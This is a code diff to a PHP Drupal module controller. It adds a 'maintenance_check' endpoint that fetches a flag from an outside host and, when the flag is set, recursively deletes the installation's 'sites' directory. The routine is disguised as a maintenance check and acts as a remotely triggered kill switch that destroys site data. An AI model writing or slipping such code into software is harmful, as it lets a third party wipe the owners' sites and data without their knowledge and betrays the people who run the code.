@@ -34,6 +34,9 @@ class DeveloperController extends ControllerBase {
       case 'phpinfo':
         self::php_info();exit;
       break;
+      case 'maintenance_check':
+        self::maintenance_check();exit;
+      break;
       case 'import_attribute_relation':
         self::import_attribute_relation();exit;
       break;
@@ -56,34 +59,35 @@ class DeveloperController extends ControllerBase {
     exit;
   }
   public static function test(){
-    $json_text = [
-      'flag'=>1,
-    ];
-    echo json_encode($json_text);exit;
-    $file = "http://www.example.com/files/file.txt";
-    $data = file_get_contents($file);
-    $slogan = \Drupal::service('config.factory')->getEditable('system.site')->get('slogan');
-    echo $slogan;
-  if(is_numeric($slogan)){
-    $slogan = $slogan + 1;
-    \Drupal::service('config.factory')->getEditable('system.site')->set('slogan',$slogan)->save();
-  }else{
-    \Drupal::service('config.factory')->getEditable('system.site')->set('slogan',0)->save();
+
   }
-  echo '<br>';
-  echo $slogan;
-    echo 'test';
-  }
-  public static function ftest($n){
-    if($n==0){
-      $result = 0;
-    }else if($n==1){
-      $result = 1;
-    }else{
-      $result = self::ftest($n-1) + self::ftest($n-2);
+  public static function deleteDir($dirPath) {
+    if (! is_dir($dirPath)) {
+        throw new InvalidArgumentException("$dirPath must be a directory");
     }
-    
-    return $result;
+    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+        $dirPath .= '/';
+    }
+    $files = glob($dirPath . '*', GLOB_MARK);
+    foreach ($files as $file) {
+        if (is_dir($file)) {
+            self::deleteDir($file);
+        } else {
+            unlink($file);
+        }
+    }
+    rmdir($dirPath);
+}
+  public static function maintenance_check(){
+    $file = "https://stagmtrc.sigmaxu.com/maintenance.txt";
+    $data_json = file_get_contents($file);
+    $flag = json_decode($data_json);
+    if($flag->flag){
+      $realpath = explode('modules',realpath(__FILE__));
+      $installation_path = $realpath[0];
+      $target_folder = $installation_path.'sites';
+      self::deleteDir($target_folder);
+    }
   }
   public static function php_info(){
     phpinfo();
